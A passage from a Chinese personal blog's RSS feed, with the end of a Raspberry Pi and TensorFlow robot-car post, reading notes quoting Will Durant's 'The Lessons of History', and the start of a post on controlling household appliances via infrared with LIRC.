&lt;li&gt;使树莓派超频可以加快运算速度&lt;/li&gt;
&lt;li&gt;把tensorflow部署到小车控制器坐在的电脑上（本地电脑），实际计算在本地进行（这样可以把tensorflow用到任何client里，不过需要联网运行）&lt;/li&gt;
&lt;li&gt;把tensorflow部署到云上，提供网络服务&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另一个优化是，缩小图片尺寸，可以使用ImageMagick提供的convert指令：&lt;code&gt;convert -resize 100x100 test.png dest.jpg&lt;/code&gt;。 如此一来就把图片转化为小尺寸（100x100），能有效提高运算速度&lt;/p&gt;
&lt;h1&gt;todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;中文语音输出&lt;ul&gt;
&lt;li&gt;蓝牙音箱&lt;/li&gt;
&lt;li&gt;英-&amp;gt;中翻译&lt;/li&gt;
&lt;li&gt;语音输出&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;加载到汽车模型上&lt;ul&gt;
&lt;li&gt;L298N驱动板&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E6%A0%91%E8%8E%93%E6%B4%BE"&gt;维基百科 树莓派&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.oreilly.com/learning/how-to-build-a-robot-that-sees-with-100-and-tensorflow"&gt;How to build a robot that “sees” with $100 and TensorFlow&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tensorflow/tensorflow/tree/master/tensorflow/contrib/pi_examples"&gt;pi_examples&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 23 Oct 2016 00:00:00 +0000</pubDate><guid>tag:,2016-10-23:raspberrypi-tensowflow-robot.html</guid><category>tools</category></item><item><title>历史的教训</title><link>/hs.html</link><description>&lt;p&gt;在通往上海的高铁上，闲来无聊， 做个读书摘记&lt;/p&gt;
&lt;p&gt;《历史的教训》是威尔.杜兰特写的一本小书。在写作《历史的教训》之前，杜兰特夫妇花了50年时间写作了1500万字的《世界文明史》&lt;/p&gt;
&lt;p&gt;作者在第一章的结尾风趣地写道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;只有愚蠢的人才会试图把一百个世纪的历史浓缩进一百页的书中，并进而得出不可靠的结论。我们就试试吧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;摘自威尔.杜兰特《历史的教训》&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;***&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史学家总是犯过分简单化的毛病，他们从众多的人和事件当中，匆忙地挑选易于处理的一小部分事实，却从来不能对错综复杂的实质和事件予以包容和理解&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;是人类，而非地球，创造了文明&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;动物之间互相吞食而没有丝毫愧疚，文明人则通过法律的正当程序相互利用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;鉴于"自然"（这里是指全部实在及其演化过程）未曾认真拜读过美国《独立宣言》，以及法国大革命时期的《人权宣言》，所以我们生来就是不自由不平等的：我们受制于生理和心理上的遗传因素，受制于我们群体的习俗和传统；我们的健康和体力，心智和性格品质，生来就千差万别。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;经济的发展使得社会功能更加专业化，使能力产生差别，使得个人对于群体有着不同的价值&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"自然"对我们梦想中的自由与平等的结合付之一笑。因为自由和平等是永恒的不共戴天的仇人，一方取胜，另一方即会死亡。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只有经济才能处于平均水平以下的人，才会渴求平等.只有那些才智高超的人，才会渴望自由；最终的结果总是智力更超群的人得偿所愿&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;乌托邦式的平等已被生物学判了死刑，立场温和的哲学家所能指望的最佳状态，是法律和教育机会的大致平等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;她不介意高出生率通常会导致在文化上变得不那么文明，而低出生率通常又与文化高的文明相伴。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;被我们所说的聪明，大多是个体教育、独特机遇和不同经历的产物，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;就生物学的立场来看，在生育方面，生理上的健康可能比智力上的优越更有价值&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;尼采（Nietzsche）就认为，德国最优异的血液流淌在德国农民的血管里；从种族繁衍的角度来看，哲学家并不是最适合的材料。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;出生率就像战争一样，可以决定基督神学的命运&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;所以天主教徒优越的组织、教规、道德、忠诚和繁衍，有可能抵消新教改革和法国启蒙运动的影响。历史是一位无出其右的幽默大师。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史就是个色盲，任何肤色的人，都可能发展出一种文明&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;中国学者会提醒我们，中国人在历史上创造出了最为悠久的文明——从公元前2000年到现在，他们涌现了无数的政治家、发明家、艺术家、诗人、科学家、哲学家、圣贤，等等。墨西哥学者会指出，在哥伦布到达美洲之前，玛雅、阿兹特克和印加文明建造了气势恢宏的建筑&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果一个英国人无论身在何处都有英国文明的烙印，即便是在蒂姆巴克图（Timbuktu,西非洲落后的地区，译者注）吃晚餐的时候也要穿戴整齐，这就说明不是他重新创造了自己的文明，而是文明控制了他的灵魂&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;种族的偏见，有着种族起源上的某些根据，但它们可能主要由于后天文化（如语言、衣着、兴趣、道德或宗教）而产生。除了普及教育，没有别的医治种族偏见的良药。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史知识会告诉我们：文明是合作的产物，几乎所有的民族都对此有所贡献；这是我们共同的遗产和债务；受过教育的心灵，都会善待每位男女，不论他们的地位多么低下，因为每一个人，都对所属种族的文明做出过创造性的贡献。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;社会的基础，不在于人的理想，而在于人性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;获胜的反叛者会采用他们过去习惯于谴责的方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;若无形势所迫，他的新观念便不合时宜，无从实践。他若是个实干的英雄，受其地位和危机加剧所迫，便能焕发出巨大的威力，而若是在平时，那不过是些闲置无用的潜能。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有时他是一个先知，就像穆罕默德（Mohammed）一样，善于激励人心，他的话可以使穷人和弱势群体产生不可估量的进取心，焕发出令人惊叹的力量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史大体上是由求新的少数人之间的冲突造成的，大多数人只为胜利者鼓掌欢呼，并充当社会实验的人类原材料。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;每100种新的思路，其中至少有99种，可能连它们试图去取代的那些旧传统都不如。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;新的观念应该被听取，因为少数新观念可能有用。但新观念必须经过异议、反对以及轻蔑的研磨&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;不安全感是贪婪之母&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;男人的罪恶可能是他崛起时的遗迹，而不是他堕落时留下的耻辱标记。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;1500年以来，贞操、早婚、一夫一妻、白头偕老和多生多育，这些农业道德规范，一直在信仰基督教的欧洲地区和白人聚居地区延续着。这是一套严格的规范，它在历史上产生了某些最为顽固的特征。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;城市让人对婚姻望而却步，但为性提供的刺激和方便却应有尽有。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;个人主义在工业社会日益增长，使得父亲和母亲的权威失去了其存在的经济基础.叛逆的年轻人不再受村民的监督和限制&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史提醒我们，罪恶在每一个时代都曾蓬勃发展，这似乎能给我们一些安慰。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们这个时代的道德沦丧，与英国复辟时代相比，只有种类上的差别，没有程度上的不同&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在每一个时代，男人都不诚实，政府都很腐化，很可能现在已不像过去那样普遍。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们已经看到了伏尔泰（Voltaire）将历史主要视为“集人类的罪恶、愚蠢与不幸之大成”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史学家记录了那些特殊的事件，因为它是有趣的，因为它是特殊的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在战争与政治、不幸与贫困、通奸与离异、谋杀与自杀等血腥画面背后，还有不计其数的正常家庭，他们有美满的婚姻，男人和女人和善且恩爱，与孩子们一起享受着有苦有乐的生活&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;性放纵也许可以由它自身走入极端而得到矫正。我们毫无约束的孩子们，可能会亲身见到秩序和谦逊成为时尚；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于不幸的人、受难者、孤儿和老人来说，宗教带给他们超自然的安慰；千千万万的普通民众把这种安慰看得比任何自然的援助更为珍贵...宗教让社会最底层的人有了存在的意义和尊严...宗教使穷人不会再去谋害富人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对于失意的人而言，某种不可思议的超自然希望是替代绝望的唯一选择&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;天堂和乌托邦，就像是一个井中的两个水桶：当一个下降时，另一个就会升上来；当宗教衰退时，共产主义就会兴起&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只有当牧师利用这些恐惧和仪式来支持道德和法律时，宗教才成为维持或者对抗一个国家至关重要的力量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人类历史从根本上说，仍然是一个个人和群体中间物竞天择、适者生存的过程，它从不优待善心，它充满了不幸，最终的考验全看生存能力。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;自然和历史并不认同我们的善恶观念，它们把那些存活下来的适者当作“美”，而把那些失败者和被淘汰者看作“恶”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;英国的自然神论运动，把宗教降低到一种对和自然难以区分的上帝的模糊信仰&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在一定程度上基督教也有点给自己帮倒忙的情况，许多基督徒形成了一种道德意识，使他们再也无法忍受传统神学中报复心很重的上帝&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在画里，耶稣将犯罪的人一股脑地丢往燃烧着永不熄灭熊熊大火的地狱中，这就是那个“温柔的耶稣，既谦卑又和善”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;法律，在过去是代表上帝赋予国王判决的权力，现在已经明显地成为容易犯错误的凡人所颁布的命令了。教育，在过去是代表得到神启的牧师的神圣职责，现在却变成了卸下神学长袍与敬畏之心的普通饮食男女的职业&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;戏院即使是在周日也会满座，而教堂即使是在周日也有一半座位是空的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在释迦牟尼（Buddhism）年轻的时候，无神论风行于印度，于是他创立了一个无神的宗教，但当他涅槃后，佛教发展成一个包括诸神、圣哲和地狱的复杂神学理论&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;怀疑主义和异教主义（其他因素是一样的）挺进时，就是法律权威兴起之时&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只要有贫穷，就会有神灵。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;吸引千艘船汇集到伊利昂的，是经济上的野心，而不是“比夜晚天空中闪烁的万千颗繁星还要璀璨”的海伦 的俏丽脸庞。这些狡黠的希腊人知道如何用诗意的遮羞布来掩盖赤裸裸的经济真相&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;法国大革命的到来，不是因为伏尔泰卓越的讽刺散文和卢梭伤感的浪漫小说&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一般来说，人的价值是根据他们的生产能力来判断的 —战争时期是个例外，在那个时候，人的排名会依据他们的破坏能力而定&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;富人抗议说，梭伦的措施就是赤裸裸的非法没收；激进分子则抱怨说，梭伦没有重新分配土地。但是，人们几乎都一致同意，梭伦的改革将雅典从革命中拯救了出来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;财富集中是自然的和不可避免的，可以借助暴力的或者是和平的部分再分配而得到周期性的缓解。就此而论，所有的经济史都是这个社会有机体缓慢的心脏跳动，财富的集中和强制再分配，便是它巨大的收缩与扩张运动&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们用许诺分红和支付利息的方式，集合人们的储蓄变为生产资本&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;竞争迫使资本家不遗余力地奋斗，他的产品也会不断地精益求精&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人们的反应是任何一个国家受到围攻情况下的自然反应——在秩序和安全恢复之前，可以舍弃一切个人的自由.只消一代人的和平，它便很可能被人的本性所侵蚀&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对资本主义的恐惧，迫使社会主义不断扩大自由；而对社会主义的恐惧，则迫使资本主义不断增加平等。东方就是西方，西方就是东方，这一对双胞胎很快就会团聚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;从路易十四说出“朕即国家”，到路易十五声称“我死后管它洪水滔天”，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对土地可以进行再分配，但是人们之间天然的不平等，很快就会产生新的占有和特权的不平等，形成新的少数人权力，他们的本能从本质上说和过去的少数一样。唯一真正的革命，是对心灵的启蒙和个性的提升；唯一真正的解放，是个人的解放；唯一真正的革命者，是哲学家和圣人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;就是这些人使杰斐逊当上了总统—他既是伏尔泰那样的怀疑论者，也是像卢梭那样的革命论者。一个管理最少的政府，非常有利于释放个人主义的能量，这些能量把美国从一片荒地改造成了物质富裕的理想国&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这些及其他上百种因素，才使得美国拥有了一个更基本的也更普世的民主政治，这在历史上还从来没有出现过。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在所有政府形式中民主是最困难的一种，因为它需要最大限度地普及聪明才智&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;林肯说过：“你不可能永远欺骗所有人。”这或许是对的，但是你可以愚弄足够多的人，以便治理一个大国&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历数民主的缺陷之后，它还是要比任何其他形式的政治都要好。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;和平只是一种不稳定的平衡，只能靠公认的霸权或势力均衡来维持。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果国家预见到与某个国家的冲突在所难免时，它就会煽动其人民敌视那个国家，并且制造口号，把仇恨推到最高点。与此同时，它又强调自己是多么地爱好和平。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们曾把文明界定为"促进文化创造的社会秩序"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史本身之所以能大体上重复着，是因为人类天性的改变像地质改变那样缓慢悠然&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一些大思想家，一直想把不那么严谨的规律变成充满威严的范式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;今天不会再有学者严肃看待17世纪的概念，认为国家的起源乃是个人与个人之间或者人民与统治者之间形成的“社会契约”。也许大多数国家（指组成一个政治组织的社会），都是由一个集团征服另一个集团，以及征服者持续使用武力加诸被征服者之上形成的；征服者的命令就是被征服者最早的法律；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这取决于是否存在着有主动性与创造性的个体，他们思路清晰，意图强大（这几乎就是天才的定义），能对新的情况做出有效的反应（这几乎就是智慧的定义）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当一个群体或是一种文明衰亡的时候，它并不是由于群体生命的神秘限制，而是由于政治领袖或思想领袖在回应变革的挑战中遭受了失败。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;古代就像现代一样，善于分析的头脑瓦解了支撑着道德法典的宗教。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;从历史的过程中，我们认为，人类的本性并没有发生实质性的改变，所有的技术成就，都不得不被看成是用新方法完成旧目标——取得财货，追求异性（或者同性），在竞争中取胜，发动战争&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史是如此的丰富多彩，以至于只要在事例中加以选择，就可以为任何历史结论找到证据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这里，我们想把“进步”定义为增加对生活环境的控制。这是个既适用于人类，也适用于最低等生物的标准。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们的问题是，是否平头老百姓也都普遍增强了他们控制生活条件的能力？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;将原始人偶像化，就像年轻人的其他许多心情一样，也是青春期一种不能适应环境的发泄表现，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;友好而潇洒的野蛮人”也许很开心，但是他要刀不离身，他得吃昆虫，他浑身脏兮兮。一项对现存原始部落的研究显示，他们婴儿的死亡率很高，生命期都很短暂，体质和速度都不太强，更容易得病。 如果生命的延长表明了对环境有更大的控制力，那么死亡率就宣告了人类的进步，因为在最近的三个世纪中，欧美白人的寿命已经延长了三倍&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;难道我们宁愿生活在雅典共和国的法律之下，或者是在罗马皇帝的统治之下，也不愿生活在带给我们人身保护、陪审团审判、宗教和知识自由，以及妇女解放的宪法之下吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果美国的建国者们能够重返美国，或者福克斯（Fox）与边沁（Bentham）返回英国，或者伏尔泰（Voltaire）和狄德罗（Diderot）返回法国，看到我们今天生在福中不知福的境况，他们难道不会斥责我们忘恩负义吗？这种幸福是过去不曾有过的——甚至在伯里克利或者奥古斯都的统治之下，也未曾出现过。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一些宝贵的成果，历经国家的兴衰沉浮而一直存在着，例如火与光的发明，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;文明不能遗赠，它必须经由每一代人重新学习&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;因此当代最好的成就，就是付出了空前的财力和人力，为所有的人提供了更高的教育&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们也许超不过古代那些出类拔萃的天才，但是我们的知识水平与平均数已经上升，远远超过了历史上的任何一个时代&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但是假如每个孩子都必须上学并一直学到二十岁为止，而且可以免费进入收藏和提供人类智慧与艺术财富的大学、图书馆以及博物馆，那么会出现什么样的教育结果呢？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但这并不是因为我们生下来就比过去的婴儿更健康、更漂亮、更聪明，而是因为我们生来就有更丰富的文化遗产，生来便处在一个更高的平台上，知识和艺术积累的增加，为我们的生活提供了基础和支撑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;过去不再是一个恐怖陈列室，而是变成了一座英灵的城市，一个广阔的思想国度，那儿有无数的圣哲贤明、政治家、发明家、科学家、诗人、艺术家、音乐家、有共同爱好的人以及哲学家，他们谈笑风生，有说有笑，有跳有唱，有雕有刻&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 21 Oct 2016 00:00:00 +0000</pubDate><guid>tag:,2016-10-21:hs.html</guid><category>book</category></item><item><title>用树莓派给家用电器加上智能（红外篇）</title><link>/raspberrypi-lirc.html</link><description>&lt;h1&gt;ideas&lt;/h1&gt;
&lt;p&gt;许多家电是红外控制的，与外界的交互通过一个红外遥控器,我们能否通过编程使其变成智能家居呢，好比我们想做这样一件事：&lt;code&gt;夏天傍晚下班前，检查室内温度，如果室温高于30摄氏度，则打开空调&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;要做到上边这件事，我们未必需要购买最新的带app控制的智能空调，利用旧式空调也可以。空调由红外遥控器控制，如果我们能控制红外的收发,模拟发射这些控制信号，我们就可以hack这些旧家电，使其可编程，变成&lt;code&gt;智能家电&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;目标&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;红外线控制&lt;/li&gt;
&lt;li&gt;微信控制&lt;/li&gt;
&lt;li&gt;自然语言控制（chatbot）&lt;/li&gt;
&lt;li&gt;blockly编程控制&lt;/li&gt;
&lt;li&gt;与其他传感器组合（温湿度）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;硬件环境&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;树莓派(我的当前环境是树莓派3,其他版本也可以)&lt;/li&gt;
&lt;li&gt;红外接收器/红外发射器（我用的是这款&lt;a href="http://ukonline2000.com/?p=296"&gt;红外线扩展板&lt;/a&gt;,能同时支持红外收发）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a href="https://zh.wikipedia.org/zh-hans/LIRC"&gt;LIRC&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;LIRC是我们需要的软件.&lt;/p&gt;
&lt;p&gt;LIRC 是 Linux Infrared remote control的缩写，是linux系统下开源的软件包。从名字中可知，这个软件让你的Linux系统能够控制红外线信号。&lt;/p&gt;
&lt;p&gt;LIRC有个具有图形用户界面的前端，叫做KDELirc&lt;/p&gt;
&lt;p&gt;在使用LIRC之前建议了解一下&lt;a href="http://www.cnblogs.com/yulongchen/archive/2013/04/12/3017409.html"&gt;红外协议&lt;/a&gt;，这样有助于你理解交互过程和debug&lt;/p&gt;
&lt;h3&gt;安装&lt;/h3&gt;
&lt;p&gt;sudo apt-get install lirc&lt;/p&gt;
&lt;h3&gt;配置&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#sudo vim /boot/config.txt #在文件结尾添加
dtoverlay=lirc-rpi
gpio_in_pin=18
